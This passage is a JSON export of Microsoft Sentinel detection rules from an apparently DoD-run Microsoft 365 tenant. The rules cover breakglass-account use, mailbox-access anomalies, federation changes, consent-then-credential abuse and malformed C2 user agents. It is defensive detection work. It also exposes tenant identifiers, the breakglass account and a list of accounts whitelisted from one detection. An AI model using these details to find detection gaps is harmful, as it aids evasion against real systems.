365,IaaS\nMITRE:TA0004;T1078;T1078.004","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T20:24:19.7473421Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/fb6928e3-45a5-4d6d-b0db-bf4453d0ff8c","name":"fb6928e3-45a5-4d6d-b0db-bf4453d0ff8c","etag":"\"87002159-0000-2700-0000-66fdc1a90000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5M","queryPeriod":"PT5M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"SigninLogs\r\n| where UserPrincipalName == \"dodina@dod365.onmicrosoft.us\"","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":["T1485","T1496","T0813"],"displayName":"DoD365 Breakglass account logs in","enabled":true,"description":"Created by DEOS team to generate a Sentinel alert when the breakglass account logs in.\nPLATFORM:Azure AD,Microsoft 365,IaaS\nMITRE:TA0001;T1078;T1078.004","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T21:56:56.975676Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/962d7575-4e57-4bba-b418-1a713b7c33b3","name":"962d7575-4e57-4bba-b418-1a713b7c33b3","etag":"\"87004757-0000-2700-0000-66fdc18a0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5M","queryPeriod":"PT5M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"OfficeActivity\r\n| where UserId == \"dodina@dod365.onmicrosoft.us\"","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":["T1499","T0813","T0827"],"displayName":"DoD365 Breakglass account performs actions in Office 365","enabled":true,"description":"Created by DEOS team to generate a Sentinel alert when the breakglass account performs activities in DoD365\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0001;T1199,TA0004;T1078;T1078.004,TA0005;T1562;T1562.008","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T21:56:24.3585778Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/54690c01-1d9b-435a-b71d-e56e11c86169","name":"54690c01-1d9b-435a-b71d-e56e11c86169","etag":"\"87008e55-0000-2700-0000-66fdc1690000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5M","queryPeriod":"PT5M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"AzureActivity\r\n| where Caller == \"dodina@dod365.onmicrosoft.us\"","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":["T1499","T0815","T0826","T0827"],"displayName":"DoD365 Breakglass account performs activities in Azure","enabled":true,"description":"Created by DEOS team to generate a Sentinel alert when the breakglass account performs activity in Azure\nPLATFORM:Azure AD,IaaS,Microsoft 365\nMITRE:TA0003;T1098;T1098.001;T1098.003,TA0004;T1078;T1078.004","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T21:55:51.2220509Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/56a329f0-4609-4ab5-9bf7-8a1033f5254e","name":"56a329f0-4609-4ab5-9bf7-8a1033f5254e","etag":"\"79004a2f-0000-2700-0000-63daad940000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let starttime = 14d;\nlet endtime = 1d;\nlet timeframe = 1h;\nlet scorethreshold = 1.5;\nlet percentthreshold = 50;\n// Preparing the time series data aggregated hourly count of MailItemsAccessd Operation in the form of multi-value array to use with time series anomaly function.\nlet TimeSeriesData = \nOfficeActivity \n| where TimeGenerated  between (startofday(ago(starttime))..startofday(ago(endtime)))\n| where OfficeWorkload=~ \"Exchange\" and Operation =~ \"MailItemsAccessed\" and ResultStatus =~ \"Succeeded\"\n| project TimeGenerated, Operation, MailboxOwnerUPN \n| make-series Total=count() on TimeGenerated from startofday(ago(starttime)) to startofday(ago(endtime)) step timeframe;\nlet TimeSeriesAlerts = TimeSeriesData\n| extend (anomalies, score, baseline) = series_decompose_anomalies(Total, scorethreshold, -1, 'linefit')\n| mv-expand Total to typeof(double), TimeGenerated to typeof(datetime), anomalies to typeof(double), score to typeof(double), baseline to typeof(long)\n| where anomalies > 0\n| project TimeGenerated, Total, baseline, anomalies, score;\n// Joining the flagged outlier from the previous step with the original dataset to present contextual information\n// during the anomalyhour to analysts to conduct investigation or informed decisions.\nTimeSeriesAlerts | where TimeGenerated > ago(2d)\n// Join against base logs since specified timeframe to retrive records associated with the hour of anomoly\n| join ( \n    OfficeActivity \n| where TimeGenerated > ago(2d)\n| where OfficeWorkload=~ \"Exchange\" and Operation =~ \"MailItemsAccessed\" and ResultStatus =~ \"Succeeded\"\n) on TimeGenerated","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"ClientIP"}]},{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"OfficeObjectId"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Collection"],"techniques":["T1114"],"displayName":"Exchange workflow MailItemsAccessed operation anomaly","enabled":false,"description":"Identifies anomalous increases in Exchange mail items accessed operations. \nThe query leverages KQL built-in anomaly detection algorithms to find large deviations from baseline patterns. \nSudden increases in execution frequency of sensitive actions should be further investigated for malicious activity.\nManually change scorethreshold from 1.5 to 3 or higher to reduce the noise based on outliers flagged from the query criteria.\nRead more about MailItemsAccessed- https://docs.microsoft.com/microsoft-365/compliance/advanced-audit?view=o365-worldwide#mailitemsaccessed","alertRuleTemplateName":"b4ceb583-4c44-4555-8ecf-39f572e827ba","lastModifiedUtc":"2023-02-01T18:21:08.6462209Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/1f399998-9ecf-4f1b-ba19-57b7f28ef86b","name":"1f399998-9ecf-4f1b-ba19-57b7f28ef86b","etag":"\"87004a1e-0000-2700-0000-66fdbdb20000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let auditLookback = 1d;\n(union isfuzzy=true\n(\nAuditLogs\n| where TimeGenerated > ago(auditLookback)\n| where OperationName =~ \"Set federation settings on domain\"\n//| where Result =~ \"success\"   // commenting out, as it may be interesting to capture failed attempts\n| mv-expand TargetResources\n| extend modifiedProperties = parse_json(TargetResources).modifiedProperties\n| mv-expand modifiedProperties\n| extend targetDisplayName = tostring(parse_json(modifiedProperties).displayName)\n| mv-expand AdditionalDetails\n),\n(\nAuditLogs\n| where TimeGenerated > ago(auditLookback)\n| where OperationName =~ \"Set domain authentication\"\n//| where Result =~ \"success\"   // commenting out, as it may be interesting to capture failed attempts\n| mv-expand TargetResources\n| extend modifiedProperties = parse_json(TargetResources).modifiedProperties\n| mv-expand modifiedProperties\n| extend targetDisplayName = tostring(parse_json(modifiedProperties).displayName), NewDomainValue=tostring(parse_json(modifiedProperties).newValue)\n| where NewDomainValue has \"Federated\"\n)\n)\n| extend UserAgent = iff(AdditionalDetails.key == \"User-Agent\",tostring(AdditionalDetails.value),\"\")\n| extend InitiatingUserOrApp = iff(isnotempty(InitiatedBy.user.userPrincipalName),tostring(InitiatedBy.user.userPrincipalName), tostring(InitiatedBy.app.displayName))\n| extend InitiatingIpAddress = iff(isnotempty(InitiatedBy.user.ipAddress), tostring(InitiatedBy.user.ipAddress), tostring(InitiatedBy.app.ipAddress))\n| project-reorder TimeGenerated, OperationName, InitiatingUserOrApp, AADOperationType, targetDisplayName, Result, InitiatingIpAddress, UserAgent, CorrelationId, TenantId, AADTenantId\n| extend timestamp = TimeGenerated, AccountCustomEntity = InitiatingUserOrApp, IPCustomEntity = InitiatingIpAddress","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence","DefenseEvasion"],"techniques":["T1556","T1078"],"displayName":"Modified domain federation trust settings","enabled":true,"description":"This will alert when a user or application modifies the federation settings on the domain or Update domain authentication from Managed to Federated.\nFor example, this alert will trigger when a new Active Directory Federated Service (ADFS) TrustedRealm object, such as a signing certificate, is added to the domain.\nModification to domain federation settings should be rare. Confirm the added or modified target domain/URL is legitimate administrator behavior.\nTo understand why an authorized user may update settings for a federated domain in Office 365, Azure, or Intune, see: https://docs.microsoft.com/office365/troubleshoot/active-directory/update-federated-domain-office-365.\nFor details on security realms that accept security tokens, see the ADFS Proxy Protocol (MS-ADFSPP) specification: https://docs.microsoft.com/openspecs/windows_protocols/ms-adfspp/e7b9ea73-1980-4318-96a6-da559486664b.\nFor further information on AuditLogs please see https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-audit-activities.\n\nPersistence, Defense Evasion,\nT1556 - Modify Authentication Process: T1556.001, T1078: Valid Accounts\n\nPLATFORM:Azure AD,Microsoft 365,IaaS\nMITRE:TA0004;T1098;T1098.003,TA0005;T1556;T1556.006;T1556.007,TA0006;T1556;T1556.006;T1556.007","alertRuleTemplateName":"95dc4ae3-e0f2-48bd-b996-cdd22b90f9af","lastModifiedUtc":"2024-10-02T21:40:01.0848016Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/d119a1e8-f7ed-4046-bd7f-55e3de990126","name":"d119a1e8-f7ed-4046-bd7f-55e3de990126","etag":"\"cd004c7c-0000-2700-0000-62d573520000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P2D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let auditLookbackStart = 2d;\nlet auditLookbackEnd = 1d;\nAuditLogs\n| where TimeGenerated >= ago(auditLookbackStart)\n| where OperationName =~ \"Consent to application\" \n| where Result =~ \"success\"\n| mv-expand target = TargetResources\n| extend targetResourceName = tostring(target.displayName)\n| extend targetResourceID = tostring(target.id)\n| extend targetResourceType = tostring(target.type)\n| extend targetModifiedProp = TargetResources[0].modifiedProperties\n| extend isAdminConsent = targetModifiedProp[0].newValue\n| extend Consent_ServicePrincipalNames = targetModifiedProp[5].newValue\n| extend Consent_Permissions = targetModifiedProp[4].newValue\n| extend Consent_InitiatingUserOrApp = iff(isnotempty(InitiatedBy.user.userPrincipalName),tostring(InitiatedBy.user.userPrincipalName), tostring(InitiatedBy.app.displayName))\n| extend Consent_InitiatingIpAddress = iff(isnotempty(InitiatedBy.user.ipAddress), tostring(InitiatedBy.user.ipAddress), tostring(InitiatedBy.app.ipAddress))\n| join ( \nAuditLogs\n| where TimeGenerated  >= ago(auditLookbackEnd)\n| where OperationName =~ \"Add service principal credentials\"\n| where Result =~ \"success\"\n| mv-expand target = TargetResources\n| extend targetResourceName = tostring(target.displayName)\n| extend targetResourceID = tostring(target.id)\n| extend targetModifiedProp = TargetResources[0].modifiedProperties\n| extend Credential_KeyDescription = targetModifiedProp[0].newValue\n| extend UpdatedProperties = targetModifiedProp[1].newValue\n| extend Credential_ServicePrincipalNames = targetModifiedProp[2].newValue\n| extend Credential_InitiatingUserOrApp = iff(isnotempty(InitiatedBy.user.userPrincipalName),tostring(InitiatedBy.user.userPrincipalName), tostring(InitiatedBy.app.displayName))\n| extend Credential_InitiatingIpAddress = iff(isnotempty(InitiatedBy.user.ipAddress), tostring(InitiatedBy.user.ipAddress), tostring(InitiatedBy.app.ipAddress))\n) on targetResourceName, targetResourceID\n| extend TimeConsent = TimeGenerated, TimeCred = TimeGenerated1\n| where TimeConsent > TimeCred \n| project TimeConsent, TimeCred, Consent_InitiatingUserOrApp, Credential_InitiatingUserOrApp, targetResourceName, targetResourceType, isAdminConsent, Consent_ServicePrincipalNames, Credential_ServicePrincipalNames, Consent_Permissions, Credential_KeyDescription, Consent_InitiatingIpAddress, Credential_InitiatingIpAddress\n| extend timestamp = TimeConsent, AccountCustomEntity = Consent_InitiatingUserOrApp, IPCustomEntity = Consent_InitiatingIpAddress","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CredentialAccess"],"techniques":[],"displayName":"Credential added after admin consented to Application","enabled":true,"description":"This query will identify instances where Service Principal credentials were added to an application by one user after the application was granted admin consent rights by another user.\n If a threat actor obtains access to an account with sufficient privileges and adds the alternate authentication material triggering this event, the threat actor can now authenticate as the Application or Service Principal using this credential.\n Additional information on OAuth Credential Grants can be found in RFC 6749 Section 4.4 or https://docs.microsoft.com/azure/active-directory/develop/v2-oauth2-client-creds-grant-flow.\n For further information on AuditLogs please see https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-audit-activities","alertRuleTemplateName":"707494a5-8e44-486b-90f8-155d1797a8eb","lastModifiedUtc":"2022-07-18T14:50:57.7448821Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/d058b2b8-3de8-4123-97c9-b6a14f0d05fe","name":"d058b2b8-3de8-4123-97c9-b6a14f0d05fe","etag":"\"1b00f4d4-0000-2700-0000-66d8a6e20000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//The bigger the window the better the data sample size, as we use IP prevalence, more sample data is better.\nlet timeRange = 30d;\n//The minimum number of countries that the account has been accessed from [default: 2]\nlet minimumCountries = 2;\n//The delta (%) between the largest in-use IP and the smallest [default: 90]\nlet deltaThreshold = 95;\n//The maximum (%) threshold that the country appears in login data [default: 10]\nlet countryPrevalenceThreshold = 10;\n//The time to project forward after the last login activity [default: 60min]\nlet projectedEndTime = 60min; \n//Get Teams successful signins globally\nlet signinData =\n  SigninLogs\n  | where TimeGenerated >= ago(timeRange)\n  | where AppDisplayName has \"Teams\"\n  | where ConditionalAccessStatus =~ \"success\"\n  | extend country = tostring(LocationDetails['countryOrRegion'])\n  | where isnotempty(country) and isnotempty(IPAddress);\n// Collect successful signins to teams\nlet loginEvents = \n  signinData\n  | summarize count(), country=any(country), make_list(TimeGenerated) by IPAddress, UserPrincipalName;\n//Calcualte delta between logins\nlet loginDelta =\n  loginEvents\n  | summarize max(count_), min(count_) by UserPrincipalName\n  | extend delta = toreal(max_count_ - min_count_) / max_count_ * 100\n  | where delta >= deltaThreshold;\n//Count number of countries used to sign in\nlet countryCount =\n  loginEvents\n  | summarize Countries = dcount(country) by UserPrincipalName;\n//Join delta and sign in counts to successful logins\nloginDelta\n| join kind=rightouter  (\n  loginEvents\n) on UserPrincipalName\n| join kind=rightouter (\n  countryCount\n) on UserPrincipalName\n//Check where the record meets the minimum required countries\n| where Countries >= minimumCountries\n| join kind=leftouter (\n      signinData\n      | summarize count() by country\n      | join (\n          //Now get the total number of logins from any country and join it to the previous count in a single table\n          signinData\n          | summarize count() by country\n          | summarize sum(count_), make_list(country)\n          | mv-expand list_country\n          | extend country = tostring(list_country)\n      ) on country\n      | summarize by country, count_, sum_count_\n      //Now calculate each countries prevalence within login events\n      | extend prevalence = toreal(count_) / toreal(sum_count_) * 100\n      | project-away sum_count_\n      | order by prevalence\n) on country\n//The % that suspicious country is prevalent in data, this can be configured, less than 10% is uncommon\n| where prevalence < countryPrevalenceThreshold\n| where min_count_ == count_\n//Login start and end times from the JSON object, this is the activity window the suspicious IP was active within\n| extend EventTimes = list_TimeGenerated\n| extend SuspiciousIP = IPAddress\n| project UserPrincipalName, SuspiciousIP, UserIPDelta = delta, SuspiciousLoginCountry = country, SuspiciousCountryPrevalence = prevalence, EventTimes\n//Teams join to collect operations the user account has performed within the given time range\n| join kind=inner( \n  OfficeActivity \n  | where TimeGenerated >= ago(timeRange)\n  | where Operation in~ (\"TeamsAdminAction\", \"MemberAdded\", \"MemberRemoved\", \"MemberRoleChanged\", \"AppInstalled\", \"BotAddedToTeam\")\n  | project Operation, UserId=tolower(UserId), OperationTime=TimeGenerated\n) on $left.UserPrincipalName == $right.UserId\n| mv-expand StartTime = EventTimes\n| extend StartTime = make_datetime(StartTime)\n//The end time is projected 60 minutes forward, in case actions took place within the last hour of the final login for the suspicious IP\n| extend ProjectedEndTime = make_datetime(StartTime + projectedEndTime)\n//Limit to operations carried out by the user account in the timeframe the IP was active\n| where OperationTime between (StartTime .. ProjectedEndTime)\n| project UserPrincipalName, SuspiciousIP, StartTime, ProjectedEndTime, OperationTime, Operation, SuspiciousLoginCountry, SuspiciousCountryPrevalence\n//Filter on suspicious actions\n| extend activitySummary = pack(tostring(StartTime), pack(\"Operation\",tostring(Operation), \"OperationTime\", OperationTime))\n| summarize make_bag(activitySummary) by UserPrincipalName, SuspiciousIP, SuspiciousLoginCountry, SuspiciousCountryPrevalence\n| extend IPCustomEntity = SuspiciousIP, AccountCustomEntity = UserPrincipalName","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","Persistence"],"techniques":["T1078","T1098"],"displayName":"Anomalous login followed by Teams action","enabled":true,"description":"Detects anomalous IP address usage by user accounts and then checks to see if a suspicious Teams action is performed.\nQuery calculates IP usage Delta for each user account and selects accounts where a delta >= 90% is observed between the most and least used IP.\nTo further reduce results the query performs a prevalence check on the lowest used IP's country, only keeping IP's where the country is unusual for the tenant (dynamic ranges)\nFinally the user accounts activity within Teams logs is checked for suspicious commands (modifying user privileges or admin actions) during the period the suspicious IP was active.\n\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows;MITRE:TA0001;T1078;T1078.001,TA0003;T1078;T1078.004,TA0007;T1087;T1087.004","alertRuleTemplateName":"2b701288-b428-4fb8-805e-e4372c574786","lastModifiedUtc":"2024-09-04T18:28:49.6212367Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/b285d042-9526-49c7-a8c2-8b468e3ee125","name":"b285d042-9526-49c7-a8c2-8b468e3ee125","etag":"\"ce00ff2e-0000-2700-0000-62d57a5a0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"SigninLogs\n| where ResultType == 500121\n| where Status has \"MFA Denied; user declined the authentication\"\n| extend UserPrinciaplNameCustomEntity = UserPrincipalName\n| extend IPCustomEntity = IPAddress\n| extend URLCustomEntity = ClientAppUsed","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]},{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"URLCustomEntity"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserPrincipalName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CredentialAccess"],"techniques":["T1110"],"displayName":"Explicit MFA Deny","enabled":true,"description":"User explicitly denies MFA push, indicating that login was not expected and the account's password may be compromised.","alertRuleTemplateName":"a22740ec-fc1e-4c91-8de6-c29c6450ad00","lastModifiedUtc":"2022-07-18T15:20:57.8544753Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/a0bee7ea-73ab-4f90-9a64-e2fd83fe786b","name":"a0bee7ea-73ab-4f90-9a64-e2fd83fe786b","etag":"\"87008935-0000-2700-0000-66fdbf3a0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// name: Malformed user agent\n// description: |\n// 'Malware authors will sometimes hardcode user agent string values when writing the network communication component of their malware.\n//   Malformed user agents can be an indication of such malware.'\n// severity: Medium\n// requiredDataConnectors:\n//   - connectorId: Office365\n//     dataTypes:\n//       - OfficeActivity\n//   - connectorId: AzureActiveDirectory\n//     dataTypes:\n//       - SigninLogs\n// query: |\nlet whiteAccounts = dynamic(['disa.oe.pulse@dod365.onmicrosoft.us', 'disa.meade.oe.equip.synapp1@mail.mil', 'disa.meade.oe.equip.synapp2@mail.mil', 'disa.pentagon.jsp.mbx.equip-synapp1@mail.mil', 'disa.meade.oe.equip.synapp3@mail.mil', 'ac9cb27e-0886-4359-9a19-8669ae7749a6', 'disa.meade.oe.equip.synapp6@mail.mil', 'disa.meade.oe.equip.synapp7@mail.mil', 'disa.meade.oe.equip.synapp8@mail.mil', '70fd679f-e3a2-4dc7-bdd4-b6b03d242c58', 'disa.meade.oe.equip.synapp5@mail.mil', 'disa.meade.oe.equip.synapp4@mail.mil' ]);\nlet endtime = 1d;\n(union isfuzzy=true\n    (OfficeActivity\n    | where TimeGenerated >= ago(endtime)\n    | where UserAgent != \"\"),\n    (OfficeActivity\n    | where TimeGenerated >= ago(endtime)\n    | where RecordType in (\"AzureActiveDirectory\", \"AzureActiveDirectoryStsLogon\")\n    | extend OperationName = Operation\n    | parse ExtendedProperties with * 'User-Agent\\\\\":\\\\\"' UserAgent2 '\\\\' *\n    | parse ExtendedProperties with * 'UserAgent\",      \"Value\": \"' UserAgent1 '\"' *\n    | where isnotempty(UserAgent1) or isnotempty(UserAgent2)\n    | extend UserAgent = iff(RecordType == 'AzureActiveDirectoryStsLogon', UserAgent1, UserAgent2)\n    | summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by UserAgent, SourceIP = ClientIP, Account = UserId, Type, RecordType, Operation\n    ),\n    (SigninLogs\n    | where TimeGenerated >= ago(endtime)\n    | where isnotempty(UserAgent)\n    | summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by UserAgent, SourceIP = IPAddress, Account = UserPrincipalName, Type, OperationName, tostring(LocationDetails), tostring(DeviceDetail), AppDisplayName, ClientAppUsed\n    )\n)\n// Custom change - whitelisted the 'disa.oe.pulse' & 'disa.meade.oe.equip.synapp' accounts\n| where UserId !in (whiteAccounts) and Account !in (whiteAccounts)\n// Likely artefact of hardcoding\n| where UserAgent startswith \"User\" or UserAgent startswith '\\\"'\n    // Incorrect casing\n    or (UserAgent startswith \"Mozilla\" and not(UserAgent containscs \"Mozilla\"))\n    // Incorrect casing\n    or UserAgent containscs \"(Compatible;\"\n    // Missing MSIE version\n    or UserAgent matches regex @\"MSIE\\s?;\"\n    // Incorrect spacing around MSIE version\n    or UserAgent matches regex @\"MSIE(?:\\d|.{1,5}?\\d\\s;)\"\n| extend timestamp = StartTime, IPCustomEntity = SourceIP, AccountCustomEntity = Account\n// Uncomment the following line to count by User-Agent\n//| summarize count() by UserAgent","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"Account"},{"identifier":"Name","columnName":"Account"},{"identifier":"UPNSuffix","columnName":"MailboxOwnerUPN"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"SourceIP"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","CommandAndControl","Execution"],"techniques":["T1189","T1071","T1203"],"displayName":"Malformed user agent","enabled":false,"description":"This Sentinel Analytic \"Malformed user agent\" query can detect potential C2 or C2 agent activity.  This control provides minimal to partial coverage for a minority of this technique's T1071 sub-techniques and only some of its procedure examples. Malware authors will sometimes hardcode user agent string values when writing the network communication component of their malware. Malformed user agents can be an indication of such malware. \n\nhttps://center-for-threat-informed-defense.github.io/security-stack-mappings/Azure/README.html\nhttps://attack.mitre.org/techniques/T1071/\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0006;T1110;T1110.001;T1110.002;T1110.003;T1110.004","alertRuleTemplateName":"a357535e-f722-4afe-b375-cff362b2b376","lastModifiedUtc":"2024-10-02T21:46:34.6703204Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/b020bbf1-13b6-4fc1-a0a1-52dc694de6e4","name":"b020bbf1-13b6-4fc1-a0a1-52dc694de6e4","etag":"\"0e009f1d-0000-2700-0000-6271714c0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let timeframe = 1d;\n//Adjust this threshold to fit the environment\nlet signin_threshold = 5;\n//Make a list of all IPs with failed signins to AAD above our threshold\nlet suspicious_signins =\nSigninLogs\n| where TimeGenerated >= ago(timeframe)\n| where ResultType !in (\"0\", \"50125\", \"50140\")\n| where IPAddress != \"127.0.0.1\"\n| summarize count() by IPAddress\n| where count_ > signin_threshold\n| summarize make_list(IPAddress);\n//See if any of these IPs have sucessfully logged into *nix hosts\nlet linux_logons =\nSyslog\n| where TimeGenerated >= ago(timeframe)\n| where Facility contains \"auth\" and ProcessName != \"sudo\"\n| where SyslogMessage has \"Accepted\"\n| extend SourceIP = extract(\"(([0-9]{1,3})\\\\.([0-9]{1,3})\\\\.([0-9]{1,3})\\\\.(([0-9]{1,3})))\",1,SyslogMessage)\n| where SourceIP in (suspicious_signins)\n| extend Reason = \"Multiple failed AAD logins from IP address\"\n| project TimeGenerated, Computer, HostIP, IpAddress = SourceIP, SyslogMessage, 